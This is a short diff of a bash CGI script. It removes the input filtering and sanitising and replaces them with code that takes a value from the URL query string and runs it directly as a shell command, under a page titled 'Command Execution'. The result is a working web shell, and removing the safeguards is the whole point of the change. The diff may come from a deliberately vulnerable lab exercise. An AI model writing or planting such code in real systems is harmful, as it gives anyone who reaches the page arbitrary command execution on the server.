@@ -2,26 +2,11 @@
 
 echo Content-type: text/html
 echo ""
+echo "<html><head><title>Command Execution</title></head>"
+echo "<body>"
 
-if [[ "$QUERY_STRING" =~ "cmd" ]]
-then
-if [[ "$QUERY_STRING" =~ "&cmd" ]]
-then
-echo "Sh1t detected. Quitting"
-exit 1
-fi
+CMD_ACTION=$(echo $QUERY_STRING | cut -d\= -f2 | sed 's/+/\ /g')
 
-ip=`echo "$QUERY_STRING"|cut -d "&" -f1|cut -d "=" -f2`
+$CMD_ACTION
 
-cleanip=${ip//[^a-zA-Z0-9.]/}
-cleanip=`echo -n $cleanip | tr A-Z a-z`
-
-echo "<h3>CMD $cleanip...</h3>"
-printf "<pre>\n"
-"$cleanip"
-printf "</pre>\n"
-#ping -c 4 "$cleanip" 2>&1|sed 's/$/<br>/g'
-echo "<hr>"
-echo "<p>"
-fi
-
+echo "</body></title>"
